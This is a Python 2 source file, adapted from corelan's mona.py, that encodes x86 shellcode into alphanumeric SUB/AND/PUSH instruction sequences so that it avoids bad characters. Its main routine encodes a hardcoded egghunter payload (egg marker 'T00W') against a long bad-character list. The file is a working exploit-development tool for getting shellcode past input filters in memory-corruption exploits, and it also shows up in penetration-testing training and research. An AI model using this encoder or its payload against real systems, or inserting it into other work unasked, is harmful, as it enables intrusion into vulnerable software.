#!/usr/bin/env python

# source: https://github.com/corelan/mona/blob/master/mona.py
# courtesy to : corelan
# https://github.com/greyshell/greyshell.github.io/blob/master/downloads/code/2016/11/hpnnm-B.07.53/alphaNumEncoder_egghunter.py
# author: greyshell
# description: alphanum encoder
# modified by ring3rbell (20191210): save bytes when there are not badchars in our shellcode (we only need a PUSH shellcode values) 

import binascii
import sys
import pdb

silent = False
arch = 32

def toHex(n):
	"""
	Converts a numeric value to hex (pointer to hex)

	Arguments:
	n - the value to convert

	Return:
	A string, representing the value in hex (8 characters long)
	"""
	if arch == 32:
		return "%08x" % n
	if arch == 64:
		return "%016x" % n

def hexStrToInt(inputstr):
	"""
	Converts a string with hex bytes to a numeric value
	Arguments:
	inputstr - A string representing the bytes to convert. Example : 41414141

	Return:
	the numeric value
	"""
	valtoreturn = 0
	try:
		valtoreturn = int(inputstr, 16)
	except:
		valtoreturn = 0
	return valtoreturn

def bin2hex(binbytes):
	"""
	Converts a binary string to a string of space-separated hexadecimal bytes.
	"""
	return ' '.join('%02x' % ord(c) for c in binbytes)

def hex2bin(pattern):
	"""
	Converts a hex string (\\x??\\x??\\x??\\x??) to real hex bytes

	Arguments:
	pattern - A string representing the bytes to convert 

	Return:
	the bytes
	"""
	pattern = pattern.replace("\\x", "")
	pattern = pattern.replace("\"", "")
	pattern = pattern.replace("\'", "")
	
	return ''.join([binascii.a2b_hex(i+j) for i,j in zip(pattern[0::2],pattern[1::2])])


def checkbytes(inpattern, badpattern):
	"""
	Check if the reversebytes variable has badchars

	Arguments:
	inpattern - Bin value of the reversebytes variable
	badpattern - Bin value of bad chars

	Return:
	true o false
	"""
	inpattern = bin2hex(inpattern).split()
	badpattern = bin2hex (badpattern).split()
	for i in inpattern:
		if i in badpattern:
			return True
	
	return False
	
	

#---------------------------------------#
#   Class to encode bytes               #
#---------------------------------------#

class MnEncoder:
	""" 
	Class to encode bytes
	"""

	def __init__(self,bytestoencode,badbytes):
		self.origbytestoencode = bytestoencode
		self.bytestoencode = bytestoencode
		self.badbytes = badbytes 
	
	def encodeAlphaNum(self,badchars = []):
		encodedbytes = {}
		if not silent:
			print "[+] Using alphanum encoder"
			print "[+] Received %d bytes to encode" % len(self.origbytestoencode)
			print "[+] Nos of bad chars: %d" % len(badchars)
		"""
		# first, check if there are no bad char conflicts - AND eAX, SUB r8, SUB eAX, XOR r/m16/32, XOR r8, XOR eAX, DEC eDX , DEC eBP, DEC eSI
		PUSH eAX, PUSH eBP, POP eSP
		"""
		nobadchars = "\x25\x2a\x2d\x31\x32\x35\x4a\x4d\x4e\x50\x55\x5c"
		badbadchars = False
		#check also if NOP is badchars
		nop = '\x90'
		nopvalid = True
		for b in badchars:
			if b in nobadchars:
				print "*** Error: byte \\x%s cannot be a bad char with this encoder" % bin2hex(b)
				badbadchars = True
			if b in nop:
				print "*** Warning: byte \\x%s cannot be used as NO OPERATION opcode with this encoder" % bin2hex(b)
				nopvalid = False
		
		if badbadchars:
			return {}				
		
		
		# if all is well, explode the input to a multiple of 4
		while True:
			moduloresult = len(self.bytestoencode) % 4
			if moduloresult == 0:
				break
			else:
				# NOPS / equivalent chars
				if nopvalid:
					self.bytestoencode += '\x90'
				else:
					print "*** Error: byte \\x90 cannot be used as NO OPERATION opcode with this encoder. You MUST change the no operation opcode" 
					break
		if not len(self.bytestoencode) == len(self.origbytestoencode):
			if not silent:
				print "[+] Added %d nops to make length of input a multiple of 4" % (len(self.bytestoencode) - len(self.origbytestoencode))

		# break it down into chunks of 4 bytes
		toencodearray = []
		toencodearray = [self.bytestoencode[max(i-4,0):i] for i in range(len(self.bytestoencode), 0, -4)][::-1]
		blockcnt = 1
		encodedline = 0
		# we have to push the blocks in reverse order
		blockcnt = len(toencodearray)
		nrblocks = len(toencodearray)
		while blockcnt > 0:
			if not silent:
				print "[+] Processing block %d/%d" % (blockcnt,nrblocks)
			
			opcodes=[]
			startpos=7
			source = "".join(bin2hex(a) for a in toencodearray[blockcnt-1])
			opsimple = True		
			
			origbytes=source[startpos-7]+source[startpos-6]+source[startpos-5]+source[startpos-4]+source[startpos-3]+source[startpos-2]+source[startpos-1]+source[startpos]
			reversebytes=origbytes[6]+origbytes[7]+origbytes[4]+origbytes[5]+origbytes[2]+origbytes[3]+origbytes[0]+origbytes[1]
			revval=hexStrToInt(reversebytes)			   
			twoval=4294967296-revval
			twobytes=toHex(twoval)
			if not silent:	
				print "Opcode to produce : %s%s %s%s %s%s %s%s" % (origbytes[0],origbytes[1],origbytes[2],origbytes[3],origbytes[4],origbytes[5],origbytes[6],origbytes[7])
				print "         reversed : %s%s %s%s %s%s %s%s" % (reversebytes[0],reversebytes[1],reversebytes[2],reversebytes[3],reversebytes[4],reversebytes[5],reversebytes[6],reversebytes[7])
				print "                    -----------"				   
				print "   2's complement : %s%s %s%s %s%s %s%s" % (twobytes[0],twobytes[1],twobytes[2],twobytes[3],twobytes[4],twobytes[5],twobytes[6],twobytes[7])
			
			
			# no operations needed if no badchars in reversebytes, only PUSH
			#pdb.set_trace()
			if checkbytes(hex2bin(reversebytes),badbytes):
				opsimple = False
				encodedbytes[encodedline] = ["\x25\x35\x32\x50\x50","AND EAX,0x50503235"]
				encodedline += 1
				encodedbytes[encodedline] = ["\x25\x4a\x4d\x25\x25","AND EAX,0x25254d4a"]
				encodedline += 1
			#for each byte, start with last one first
			bcnt=3
			overflow=0		
			while bcnt >= 0 and not opsimple:
				currbyte=twobytes[(bcnt*2)]+twobytes[(bcnt*2)+1]
				currval=hexStrToInt(currbyte)-overflow
				testval=currval/3

				if testval < 32:
					#put 1 in front of byte
					currbyte="1"+currbyte
					currval=hexStrToInt(currbyte)-overflow
					overflow=1
				else:
					overflow=0

				val1=currval/3
				val2=currval/3
				val3=currval/3
				sumval=val1+val2+val3
				
				if sumval < currval:
					val3 = val3 + (currval-sumval)

				#validate / fix badchars
				
				fixvals=self.validatebadchars_enc(val1,val2,val3,badchars)
				val1="%02x" % fixvals[0]
				val2="%02x" % fixvals[1]
				val3="%02x" % fixvals[2]			
				opcodes.append(val1)
				opcodes.append(val2)
				opcodes.append(val3)
				bcnt=bcnt-1

			if not opsimple:
				# we should now have 12 bytes in opcodes

				if not silent:
					print "                    -----------"
					print "                    %s %s %s %s" % (opcodes[9],opcodes[6],opcodes[3],opcodes[0])
					print "                    %s %s %s %s" % (opcodes[10],opcodes[7],opcodes[4],opcodes[1])
					print "                    %s %s %s %s" % (opcodes[11],opcodes[8],opcodes[5],opcodes[2])
					print ""
				thisencodedbyte = "\x2D"
				thisencodedbyte += hex2bin("\\x%s" % opcodes[0])
				thisencodedbyte += hex2bin("\\x%s" % opcodes[3])
				thisencodedbyte += hex2bin("\\x%s" % opcodes[6])
				thisencodedbyte += hex2bin("\\x%s" % opcodes[9])
				encodedbytes[encodedline] = [thisencodedbyte,"SUB EAX,0x%s%s%s%s" % (opcodes[9],opcodes[6],opcodes[3],opcodes[0])]
				encodedline += 1

				thisencodedbyte = "\x2D"
				thisencodedbyte += hex2bin("\\x%s" % opcodes[1])
				thisencodedbyte += hex2bin("\\x%s" % opcodes[4])
				thisencodedbyte += hex2bin("\\x%s" % opcodes[7])
				thisencodedbyte += hex2bin("\\x%s" % opcodes[10])
				encodedbytes[encodedline] = [thisencodedbyte,"SUB EAX,0x%s%s%s%s" % (opcodes[10],opcodes[7],opcodes[4],opcodes[1])]
				encodedline += 1

				thisencodedbyte = "\x2D"
				thisencodedbyte += hex2bin("\\x%s" % opcodes[2])
				thisencodedbyte += hex2bin("\\x%s" % opcodes[5])
				thisencodedbyte += hex2bin("\\x%s" % opcodes[8])
				thisencodedbyte += hex2bin("\\x%s" % opcodes[11])
				encodedbytes[encodedline] = [thisencodedbyte,"SUB EAX,0x%s%s%s%s" % (opcodes[11],opcodes[8],opcodes[5],opcodes[2])]
				encodedline += 1

				encodedbytes[encodedline] = ["\x50","PUSH EAX"]
			else:
				#pdb.set_trace()
				opcodes = bin2hex(hex2bin(reversebytes)).split()
				#inpattern = bin2hex(inpattern).split()
				print "                    -----------"
				print "                    %s %s %s %s" % (opcodes[3],opcodes[2],opcodes[1],opcodes[0])				
				# We need only a push			
				thisencodedbyte = "\x68"
				thisencodedbyte += hex2bin("\\x%s" % opcodes[3])
				thisencodedbyte += hex2bin("\\x%s" % opcodes[2])
				thisencodedbyte += hex2bin("\\x%s" % opcodes[1])
				thisencodedbyte += hex2bin("\\x%s" % opcodes[0])
				encodedbytes[encodedline] = [thisencodedbyte,"PUSH 0x%s%s%s%s" % (opcodes[3],opcodes[2],opcodes[1],opcodes[0])]
				

			encodedline += 1
			blockcnt -= 1
	

		return encodedbytes

	def validatebadchars_enc(self,val1,val2,val3,badchars):
		newvals=[]
		allok=0
		giveup=0
		type=0
		origval1=val1
		origval2=val2
		origval3=val3
		d1=0
		d2=0
		d3=0
		lastd1=0
		lastd2=0
		lastd3=0	
		while allok==0 and giveup==0:
			#check if there are bad chars left
			charcnt=0
			val1ok=1
			val2ok=1
			val3ok=1
			while charcnt < len(badchars):
				if (hex2bin("%02x" % val1) in badchars):
					val1ok=0
				if (hex2bin("%02x" % val2) in badchars):
					val2ok=0
				if (hex2bin("%02x" % val3) in badchars):
					val3ok=0
				charcnt=charcnt+1		
			if (val1ok==0) or (val2ok==0) or (val3ok==0):
				allok=0
			else:
				allok=1
			if allok==0:
				#try first by sub 1 from val1 and val2, and add more to val3
				if type==0:
					val1=val1-1
					val2=val2-1
					val3=val3+2
					if (val1<1) or (val2==0) or (val3 > 126):
						val1=origval1
						val2=origval2
						val3=origval3
						type=1
				if type==1:			  
				#then try by add 1 to val1 and val2, and sub more from val3
					val1=val1+1
					val2=val2+1
					val3=val3-2
					if (val1>126) or (val2>126) or (val3 < 1):
						val1=origval1
						val2=origval2
						val3=origval3
						type=2	
				if type==2:
					#try by sub 2 from val1, and add 1 to val2 and val3
					val1=val1-2
					val2=val2+1
					val3=val3+1
					if (val1<1) or (val2>126) or (val3 > 126):
						val1=origval1
						val2=origval2
						val3=origval3
						type=3
				if type==3:
					#try by add 2 to val1, and sub 1 from val2 and val3
					val1=val1+2
					val2=val2-1
					val3=val3-1
					if (val1 > 126) or (val2 < 1) or (val3 < 1):
						val1=origval1
						val2=origval2
						val3=origval3
						type=4
				if type==4:
					if (val1ok==0):
						val1=val1-1
						d1=d1+1
					else:
						#now spread delta over other 2 values
						if (d1 > 0):
							val2=val2+1
							val3=origval3+d1-1
							d1=d1-1
						else:
							val1=0					
					if (val1 < 1) or (val2 > 126) or (val3 > 126):
						val1=origval1
						val2=origval2
						val3=origval3
						d1=0					
						type=5
				if type==5:
					if (val1ok==0):
						val1=val1+1
						d1=d1+1
					else:
						#now spread delta over other 2 values
						if (d1 > 0):
							val2=val2-1
							val3=origval3-d1+1
							d1=d1-1
						else:
							val1=255					
					if (val1>126) or (val2 < 1) or (val3 < 1):
						val1=origval1
						val2=origval2
						val3=origval3
						val1ok=0
						val2ok=0
						val3ok=0					
						d1=0
						d2=0
						d3=0					
						type=6
				if type==6:
					if (val1ok==0):
						val1=val1-1
						#d1=d1+1
					if (val2ok==0):
						val2=val2+1
						#d2=d2+1
					d3=origval1-val1+origval2-val2
					val3=origval3+d3
					if (lastd3==d3) and (d3 > 0):
						val1=origval1
						val2=origval2
						val3=origval3				
						giveup=1
					else:
						lastd3=d3			
					if (val1<1) or (val2 < 1) or (val3 > 126):
						val1=origval1
						val2=origval2
						val3=origval3
						giveup=1
		#check results
		charcnt=0
		val1ok=1
		val2ok=1
		val3ok=1	
		val1text="OK"	
		val2text="OK"
		val3text="OK"	
		while charcnt < len(badchars):
			if (val1 == badchars[charcnt]):
				val1ok=0
				val1text="NOK"			
			if (val2 == badchars[charcnt]):
				val2ok=0
				val2text="NOK"						
			if (val3 == badchars[charcnt]):
				val3ok=0
				val3text="NOK"						
			charcnt=charcnt+1	
			
		if (val1ok==0) or (val2ok==0) or (val3ok==0):
			print "  ** Unable to fix bad char issue !"
			print "	  -> Values to check : %s(%s) %s(%s) %s(%s) " % (bin2hex(origval1),val1text,bin2hex(origval2),val2text,bin2hex(origval3),val3text)
			val1=origval1
			val2=origval2
			val3=origval3		
		newvals.append(val1)
		newvals.append(val2)
		newvals.append(val3)
		return newvals		
	
	def printAlphaNumEncoder(self,encodedbytes):
		if len(encodedbytes) > 0:
			if not silent:
				print ""
				print "Results:"
				print "--------"
		
		encodedindex = []
		fulllist_str = ""
		fulllist_bin = ""
		sum = ""
		for i in encodedbytes:
			encodedindex.append(i)
		for i in encodedindex:
			thisline = encodedbytes[i]
			# 0 = bytes
			# 1 = info
			thislinebytes = "\\x" +  "\\x".join(bin2hex(a) for a in thisline[0])
			sum = sum + thislinebytes
			logline = "  %s : %s : %s" % (thisline[0],thislinebytes,thisline[1])
			mylogline = " %s : %s" % (thislinebytes,thisline[1])
			if not silent:
				print "%s" % mylogline
				pass
			fulllist_str += thislinebytes
			fulllist_bin += thisline[0]
			
			if not silent:
				pass
	
		return sum
		
# end of class

		
if __name__=='__main__':

	# bytestoencodestr = egghuner payload, egg marker = T00W
	bytestoencodestr = '6681CAFF0F42526A0258CD2E3C055A74EFB8543030578BFAAF75EAAF75E7FFE7'
	# Input from badchars.txt
	badbytes = hex2bin("000a0d2f3a3f40808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff")
	 

	# Encode the payload
	print '[*] Bytes to encode:', bytestoencodestr
	print 
	bytestoencode = hex2bin(bytestoencodestr)
	cEncoder = MnEncoder(bytestoencode,badbytes)
	encodedbytes = cEncoder.encodeAlphaNum(badchars = badbytes)
	encodedshellcode = cEncoder.printAlphaNumEncoder(encodedbytes)	
	print
	print '[+++++] Encoded string:'
	print encodedshellcode
	print '[+++++] Length:', len(encodedshellcode)/4
	# end of main
	
	
